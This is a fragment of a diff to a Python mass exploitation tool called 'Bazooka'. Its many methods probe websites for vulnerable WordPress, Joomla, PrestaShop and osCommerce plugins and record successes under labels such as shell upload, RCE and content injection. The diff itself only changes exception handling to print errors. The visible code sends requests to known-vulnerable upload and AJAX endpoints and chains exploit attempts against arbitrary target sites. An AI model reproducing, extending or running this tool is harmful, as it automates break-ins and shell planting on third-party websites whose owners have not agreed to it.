                 self.printor('homepageslideshow',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def imagenewsslider(self, site):
         try:
@@ -5000,7 +5249,8 @@ class Bazooka(object):
                 self.printor('imagenewsslider',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def blissnewsslider(self, site):
         try:
@@ -5010,7 +5260,8 @@ class Bazooka(object):
                 self.printor('blissnewsslider',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def xdatatoolkit(self, site):
         try:
@@ -5020,7 +5271,8 @@ class Bazooka(object):
                 self.printor('xdatatoolkit',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def powerzoomer(self, site):
         try:
@@ -5030,7 +5282,8 @@ class Bazooka(object):
                 self.printor('powerzoomer',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def woocommerceproductsfilter(self, site):
         try:
@@ -5040,7 +5293,8 @@ class Bazooka(object):
                 self.printor('woocommerceproductsfilter',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def mmformscommunity(self, site):
         try:
@@ -5050,7 +5304,8 @@ class Bazooka(object):
                 self.printor('mmformscommunity',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def developertools(self, site):
         try:
@@ -5060,7 +5315,8 @@ class Bazooka(object):
                 self.printor('developertools',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def genesis_simple(self, site):
         try:
@@ -5070,7 +5326,8 @@ class Bazooka(object):
                 self.printor('genesis_simple',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def dzs_portfolio(self, site):
         try:
@@ -5081,7 +5338,8 @@ class Bazooka(object):
                 self.printor('dzs_portfolio',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def dzs_videogallery(self, site):
         try:
@@ -5092,7 +5350,8 @@ class Bazooka(object):
                 self.printor('dzs_videogallery',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def RevsliderGetcPanel(self, site):
         try:
@@ -5102,7 +5361,8 @@ class Bazooka(object):
                 self.printor('RevsliderGetcPanel',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def showbiz(self, site):
         try:
@@ -5112,7 +5372,8 @@ class Bazooka(object):
                 self.printor('showbiz',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def SimpleAdsManager(self, site):
         try:
@@ -5122,7 +5383,8 @@ class Bazooka(object):
                 self.printor('SimpleAdsManager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def slideshowpro(self, site):
         try:
@@ -5132,7 +5394,8 @@ class Bazooka(object):
                 self.printor('slideshowpro',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wp_mobile_detectorx(self, site):
         try:
@@ -5142,7 +5405,8 @@ class Bazooka(object):
                 self.printor('wp_mobile_detector',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def InBoundio_Marketing(self, site):
         try:
@@ -5152,7 +5416,8 @@ class Bazooka(object):
                 self.printor('InBoundio_Marketing',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def dzs_zoomsounds(self, site):
         try:
@@ -5163,7 +5428,8 @@ class Bazooka(object):
                 self.printor('dzs_zoomsounds',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Reflex_Gallery(self, site):
         try:
@@ -5173,7 +5439,8 @@ class Bazooka(object):
                 self.printor('Reflex_Gallery',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Creative_Contact_Form(self, site):
         try:
@@ -5183,7 +5450,8 @@ class Bazooka(object):
                 self.printor('Creative_Contact_Form',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Realestate_tema_upload(self, site):
         try:
@@ -5193,7 +5461,8 @@ class Bazooka(object):
                 self.printor('Realestate_tema_upload',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Work_The_Flow_File_Upload(self, site):
         try:
@@ -5203,7 +5472,8 @@ class Bazooka(object):
                 self.printor('Work_The_Flow_File_Upload',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def brainstorm(self, site):
         try:
@@ -5213,7 +5483,8 @@ class Bazooka(object):
                 self.printor('brainstorm',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def php_event_calendar(self, site):
         try:
@@ -5223,7 +5494,8 @@ class Bazooka(object):
                 self.printor('php_event_calendar',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def synoptic(self, site):
         try:
@@ -5233,7 +5505,8 @@ class Bazooka(object):
                 self.printor('synoptic',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def u_design(self, site):
         try:
@@ -5243,7 +5516,8 @@ class Bazooka(object):
                 self.printor('u_design',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def workflow(self, site):
         try:
@@ -5253,7 +5527,8 @@ class Bazooka(object):
                 self.printor('workflow',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wp_shop(self, site):
         try:
@@ -5263,7 +5538,8 @@ class Bazooka(object):
                 self.printor('wp_shop',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def RobotcaLFDcnf(self, site):
         try:
@@ -5273,7 +5549,8 @@ class Bazooka(object):
                 self.printor('RobotcaLFDcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def miwoftpLFDcnf(self, site):
         try:
@@ -5283,7 +5560,8 @@ class Bazooka(object):
                 self.printor('miwoftpLFDcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def ebookLFDcnf(self, site):
         try:
@@ -5293,7 +5571,8 @@ class Bazooka(object):
                 self.printor('ebookLFDcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def yakimabaitcnf(self, site):
         try:
@@ -5303,7 +5582,8 @@ class Bazooka(object):
                 self.printor('yakimabaitcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def filemanagercnf(self, site):
         try:
@@ -5313,7 +5593,8 @@ class Bazooka(object):
                 self.printor('filemanagercnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def trinitycnf(self, site):
         try:
@@ -5323,7 +5604,8 @@ class Bazooka(object):
                 self.printor('trinitycnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def RedSteelcnf(self, site):
         try:
@@ -5333,7 +5615,8 @@ class Bazooka(object):
                 self.printor('RedSteelcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def paralleluscnf(self, site):
         try:
@@ -5343,7 +5626,8 @@ class Bazooka(object):
                 self.printor('paralleluscnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def kbslider_show(self, site):
         try:
@@ -5353,7 +5637,8 @@ class Bazooka(object):
                 self.printor('kbslider_show',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def view_pdfcnf(self, site):
         try:
@@ -5363,7 +5648,8 @@ class Bazooka(object):
                 self.printor('view_pdfcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def advanced_uploader(self, site):
         try:
@@ -5373,7 +5659,8 @@ class Bazooka(object):
                 self.printor('advanced_uploader',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def urbancitycnf(self, site):
         try:
@@ -5383,7 +5670,8 @@ class Bazooka(object):
                 self.printor('urbancitycnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def mTheme_Unuscnf(self, site):
         try:
@@ -5393,7 +5681,8 @@ class Bazooka(object):
                 self.printor('mTheme-Unuscnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def realty(self, site):
         try:
@@ -5404,7 +5693,8 @@ class Bazooka(object):
                 self.printor('realty',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def resaleform(self, site):
         try:
@@ -5414,7 +5704,8 @@ class Bazooka(object):
                 self.printor('resaleform',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def megaproduct(self, site):
         try:
@@ -5424,7 +5715,8 @@ class Bazooka(object):
                 self.printor('megaproduct',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def additionalproductstabs(self, site):
         try:
@@ -5434,7 +5726,8 @@ class Bazooka(object):
                 self.printor('additionalproductstabs',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def addthisplugin(self, site):
         try:
@@ -5444,7 +5737,8 @@ class Bazooka(object):
                 self.printor('addthisplugin',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def orderfiles(self, site):
         try:
@@ -5454,7 +5748,8 @@ class Bazooka(object):
                 self.printor('orderfiles',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def pk_vertflexmenu(self, site):
         try:
@@ -5464,7 +5759,8 @@ class Bazooka(object):
                 self.printor('pk_vertflexmenu',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def masseditproduct(self, site):
         try:
@@ -5474,7 +5770,8 @@ class Bazooka(object):
                 self.printor('masseditproduct',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def blocktestimonial(self, site):
         try:
@@ -5484,7 +5781,8 @@ class Bazooka(object):
                 self.printor('blocktestimonial',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def lokomedia(self, site):
         try:
@@ -5495,7 +5793,8 @@ class Bazooka(object):
                 self.printor('lokomedia',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def comadsmanager(self, site):
         try:
@@ -5505,7 +5804,8 @@ class Bazooka(object):
                 self.printor('comadsmanager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_simplephotogallery(self, site):
         try:
@@ -5515,7 +5815,8 @@ class Bazooka(object):
                 self.printor('com_simplephotogallery',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def com_media(self, site):
         try:
@@ -5526,7 +5827,8 @@ class Bazooka(object):
                 self.printor('com_media',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def comfabrik(self, site):
         try:
@@ -5537,7 +5839,8 @@ class Bazooka(object):
                 self.printor('comfabrik',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def mod_socialpinboard_menu(self, site):
         try:
@@ -5547,7 +5850,8 @@ class Bazooka(object):
                 self.printor('mod_socialpinboard_menu',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def foxcontact(self, site):
         try:
@@ -5561,7 +5865,8 @@ class Bazooka(object):
                 self.printor('foxcontact',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_b2jcontact(self, site):
         try:
@@ -5571,7 +5876,8 @@ class Bazooka(object):
                 self.printor('com_b2jcontact',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def com_users(self, site):
         try:
@@ -5581,7 +5887,8 @@ class Bazooka(object):
                 self.printor('com_users',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_weblinks(self, site):
         try:
@@ -5591,7 +5898,8 @@ class Bazooka(object):
                 self.printor('com_weblinks',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def mod_simplefileupload(self, site):
         try:
@@ -5601,7 +5909,8 @@ class Bazooka(object):
                 self.printor('mod_simplefileupload',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_redmystic(self, site):
         try:
@@ -5611,7 +5920,8 @@ class Bazooka(object):
                 self.printor('com_redmystic',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def com_civicrm(self, site):
         try:
@@ -5621,7 +5931,8 @@ class Bazooka(object):
                 self.printor('com_civicrm',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_acymailing(self, site):
         try:
@@ -5631,7 +5942,8 @@ class Bazooka(object):
                 self.printor('com_acymailing',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_jnewsletter(self, site):
         try:
@@ -5641,7 +5953,8 @@ class Bazooka(object):
                 self.printor('com_jnewsletter',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_jinc(self, site):
         try:
@@ -5651,7 +5964,8 @@ class Bazooka(object):
                 self.printor('com_jinc',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_maianmedia(self, site):
         try:
@@ -5661,7 +5975,8 @@ class Bazooka(object):
                 self.printor('com_maianmedia',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_jnews(self, site):
         try:
@@ -5671,7 +5986,8 @@ class Bazooka(object):
                 self.printor('com_jnews',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def com_joomleague(self, site):
         try:
@@ -5681,7 +5997,8 @@ class Bazooka(object):
                 self.printor('com_joomleague',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def com_spidersql(self, site):
@@ -5692,7 +6009,8 @@ class Bazooka(object):
                 self.printor('com_spidersql',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def mod_dvfoldercontentcnf(self, site):
         try:
@@ -5702,7 +6020,8 @@ class Bazooka(object):
                 self.printor('mod_dvfoldercontentcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def jw_allvideoscnf(self, site):
         try:
@@ -5712,7 +6031,8 @@ class Bazooka(object):
                 self.printor('jw_allvideoscnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_product_modulcnf(self, site):
         try:
@@ -5722,7 +6042,8 @@ class Bazooka(object):
                 self.printor('com_product_modulcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_cckjseblodcnf(self, site):
         try:
@@ -5732,7 +6053,8 @@ class Bazooka(object):
                 self.printor('com_cckjseblodcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_contushdvideosharecnf(self, site):
         try:
@@ -5742,7 +6064,8 @@ class Bazooka(object):
                 self.printor('com_contushdvideosharecnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def com_communitycnf(self, site):
         try:
@@ -5752,7 +6075,8 @@ class Bazooka(object):
                 self.printor('com_communitycnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass    
     def com_aceftpcnf(self, site):
         try:
@@ -5762,7 +6086,8 @@ class Bazooka(object):
                 self.printor('com_aceftpcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wddownloadcnf(self, site):
         try:
@@ -5772,7 +6097,8 @@ class Bazooka(object):
                 self.printor('wddownloadcnf',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     '''def (self, site):
         try:
@@ -5782,7 +6108,8 @@ class Bazooka(object):
                 self.printor('',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass'''
         
     def Com_Joomanagerx(self, site):
@@ -5794,7 +6121,8 @@ class Bazooka(object):
                 self.printor('Com_Joomanager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Com_Macgalleryx(self, site):
         try:
@@ -5804,7 +6132,8 @@ class Bazooka(object):
                 self.printor('Com_Macgallery',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_CCkJseblodx(self, site):
@@ -5815,7 +6144,8 @@ class Bazooka(object):
                 self.printor('Com_CCkJseblod',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_MyBlogx(self, site):
@@ -5826,7 +6156,8 @@ class Bazooka(object):
                 self.printor('Com_MyBlog',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
   
     def Com_Jdownloadsx(self, site):
@@ -5837,7 +6168,8 @@ class Bazooka(object):
                 self.printor('Com_Jdownloads',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_Fabricx(self, site):
@@ -5848,7 +6180,8 @@ class Bazooka(object):
                 self.printor('Com_Fabric',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_AdsManager(self, site):
@@ -5858,7 +6191,8 @@ class Bazooka(object):
                 self.printor('Com_AdsManager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_AdsManager_Shellx(self, site):
@@ -5868,7 +6202,8 @@ class Bazooka(object):
                 self.printor('Com_AdsManager_Shell',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Jce_Testx(self, site):
@@ -5879,7 +6214,8 @@ class Bazooka(object):
                 self.printor('Com_JCE',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -5891,7 +6227,8 @@ class Bazooka(object):
                 self.printor('Check',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def CateGory_page_iconsx(self, site):
@@ -5901,7 +6238,8 @@ class Bazooka(object):
                 self.printor('CateGory_page_icons',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -5912,7 +6250,8 @@ class Bazooka(object):
                 self.printor('Downloads_Manager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def wp_content_injectionx(self, site):
@@ -5922,7 +6261,8 @@ class Bazooka(object):
                 self.printor('Wordpress-4.7-Content-Injection',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Wp_Job_Managerx(self, site):
@@ -5934,7 +6274,8 @@ class Bazooka(object):
                 self.printor('Wp-Job-Manager',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -5952,7 +6293,8 @@ class Bazooka(object):
                 self.printor('UserProExploit',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -5964,7 +6306,8 @@ class Bazooka(object):
               self.printor('formcraftExploit_Shell',site)
             else:
                 self.formcraftExploitIndeX(site)
-        except:
+        except Exception as inst:
+            print(inst)
             self.formcraftExploitIndeX(site)
 
     def formcraftExploitIndeX(self, site):
@@ -5975,7 +6318,8 @@ class Bazooka(object):
                     self.printor('formcraft',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def cherry_pluginx(self, site):
         try:
@@ -5985,7 +6329,8 @@ class Bazooka(object):
                 self.printor('cherry plugin',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def addblockblockerx(self, site):
@@ -5996,7 +6341,8 @@ class Bazooka(object):
                 self.printor('Adblock Blocker',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def HeadWayThemeExploitx(self, site):
@@ -6006,7 +6352,8 @@ class Bazooka(object):
                 self.printor('Headway Theme',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6018,7 +6365,8 @@ class Bazooka(object):
              self.printor('Pagelines',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6029,7 +6377,8 @@ class Bazooka(object):
                     self.printor('wysijaExploit',site)
                 else:
                      pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6041,7 +6390,8 @@ class Bazooka(object):
                 self.printor('HD-Webplayer',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Gravity_Forms_Shellx(self, site):
@@ -6051,7 +6401,8 @@ class Bazooka(object):
                 self.printor('Gravity Forms',site)                     
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def WP_User_Frontendx(self, site):
         try:
@@ -6060,7 +6411,8 @@ class Bazooka(object):
                  self.printor('WP-User-Frontend',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6071,7 +6423,8 @@ class Bazooka(object):
                 self.printor('Revslider',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Revslider_SHELLx(self, site):
@@ -6104,7 +6457,8 @@ class Bazooka(object):
 
             else:
                     self.Revslider_Config(site)
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Revslider_Config(self, site):
@@ -6116,7 +6470,8 @@ class Bazooka(object):
                 self.printor('Revslider_Config',site)
             else:
                 self.Revslider_css(site)
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def viral_optinsx(self, site):
@@ -6126,7 +6481,8 @@ class Bazooka(object):
                 self.printor('viral optins',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6137,7 +6493,8 @@ class Bazooka(object):
                 self.printor('Woocomrece',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6148,7 +6505,8 @@ class Bazooka(object):
                 self.printor('osCommerce RCE',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def columnadvertsx(self, site):
@@ -6157,7 +6515,8 @@ class Bazooka(object):
             Exp = requests.get(site + i, timeout=5)
             if Exp.status_code==200:
                 self.printor('columnadverts',site)
-        except:
+        except Exception as inst:
+           print(inst)
            pass
 
     def soopamobilex(self, site):
@@ -6167,7 +6526,8 @@ class Bazooka(object):
                 self.printor('soopamobile',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6179,7 +6539,8 @@ class Bazooka(object):
                 self.printor('soopabanners',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def vtermslideshowx(self, site):
@@ -6189,7 +6550,8 @@ class Bazooka(object):
                 self.printor('vtermslideshow',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def simpleslideshowx(self, site):
         try:
@@ -6198,7 +6560,8 @@ class Bazooka(object):
                 self.printor('simpleslideshow',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def productpageadverts(self, site):
@@ -6208,7 +6571,8 @@ class Bazooka(object):
                 self.printor('productpageadverts',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def homepageadvertisex(self, site):
@@ -6218,7 +6582,8 @@ class Bazooka(object):
                 self.printor('homepageadvertise',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def homepageadvertise2x(self, site):
         try:
@@ -6227,7 +6592,8 @@ class Bazooka(object):
                 self.printor('homepageadvertise2',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def leosliderlayer(self, site):
         try:
@@ -6237,7 +6603,8 @@ class Bazooka(object):
                 self.printor('leosliderlayer',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def vtemskitter(self, site):
         try:
@@ -6246,7 +6613,8 @@ class Bazooka(object):
                 self.printor('vtemskitter',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def jro_homepageadvertisex(self, site):
         try:
@@ -6256,7 +6624,8 @@ class Bazooka(object):
                 self.printor('jro_homepageadvertise',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def attributewizardprox(self, site):
         try:
@@ -6265,7 +6634,8 @@ class Bazooka(object):
                 self.printor('attributewizardpro',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def filesupload(self, site):
@@ -6275,7 +6645,8 @@ class Bazooka(object):
                 self.printor('filesupload',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def attributewizardpro2x(self, site):
@@ -6285,7 +6656,8 @@ class Bazooka(object):
                 self.printor('attributewizardpro2',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def attributewizardpro3x(self, site):
@@ -6295,7 +6667,8 @@ class Bazooka(object):
                 self.printor('attributewizardpro.OLD',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def attributewizardpro_xx(self, site):
         try:
@@ -6304,7 +6677,8 @@ class Bazooka(object):
                 self.printor('attributewizardpro_x',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def advancedsliderx(self, site):
         try:
@@ -6313,7 +6687,8 @@ class Bazooka(object):
                 self.printor('advancedslider',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def cartabandonmentprox(self, site):
         try:
@@ -6322,7 +6697,8 @@ class Bazooka(object):
                 self.printor('cartabandonmentpro',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def cartabandonmentproOldx(self, site):
         try:
@@ -6331,7 +6707,8 @@ class Bazooka(object):
                 self.printor('cartabandonmentproOld',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def videostabx(self, site):
         try:
@@ -6340,7 +6717,8 @@ class Bazooka(object):
                 self.printor('videostab',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wg24themeadministrationx(self, site):
         Exl = site + '/modules/wg24themeadministration/wg24_ajax.php'
@@ -6350,7 +6728,8 @@ class Bazooka(object):
                 self.printor('wg24themeadministration',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def fieldvmegamenux(self, site):
@@ -6361,7 +6740,8 @@ class Bazooka(object):
                 self.printor('fieldvmegamenu',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def wdoptionpanelx(self, site):
         Exl = site + '/modules/wdoptionpanel/wdoptionpanel_ajax.php'
@@ -6371,7 +6751,8 @@ class Bazooka(object):
                 self.printor('wdoptionpanel',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def pk_flexmenux(self, site):
@@ -6383,7 +6764,8 @@ class Bazooka(object):
                     self.printor('pk_flexmenu',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def nvn_export_ordersx(self, site):
@@ -6394,7 +6776,8 @@ class Bazooka(object):
                     self.printor('nvn_export_orders',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def megamenux(self, site):
         try:
@@ -6403,7 +6786,8 @@ class Bazooka(object):
                 self.printor('megamenu',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def tdpsthemeoptionpanelx(self, site):
@@ -6414,7 +6798,8 @@ class Bazooka(object):
                 self.printor('tdpsthemeoptionpanel',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def psmodthemeoptionpanelx(self, site):
         Exl = site + '/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php'
@@ -6424,7 +6809,8 @@ class Bazooka(object):
                 self.printor('psmodthemeoptionpanel',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def libx(self, site):
         Exl = site + '/modules/lib/redactor/file_upload.php'
@@ -6434,7 +6820,8 @@ class Bazooka(object):
                self.printor('lib',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def Com_Jbcatalogx(self, site):
         Check = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php', timeout=10)
@@ -6475,7 +6862,8 @@ class Bazooka(object):
                 self.printor('wp-support-plus-responsive-ticket-system',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def eshop_magicx(self, site):
@@ -6487,7 +6875,8 @@ class Bazooka(object):
                 self.printor('eshop_magic',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
     def ungalleryx(self, site):
         try:
@@ -6498,7 +6887,8 @@ class Bazooka(object):
                 self.printor('ungallery',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_extplorerx(self, site):
@@ -6515,7 +6905,8 @@ class Bazooka(object):
                 self.printor('Com_jwallpapers',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
     def Com_facileformsx(self, site):
@@ -6532,7 +6923,8 @@ class Bazooka(object):
                 self.printor('barclaycart',site)
             else:
                 pass
-        except:
+        except Exception as inst:
+            print(inst)
             pass
 
 
@@ -6571,9 +6963,11 @@ class Bazooka(object):
                         break
                     else:
                         pass
-                except:
+                except Exception as inst:
+                    print(inst)
                     pass
-            except:
+            except Exception as inst:
+                print(inst)
                 pass
         if flaga == True:
             pass
@@ -6601,7 +6995,8 @@ class Bazooka(object):
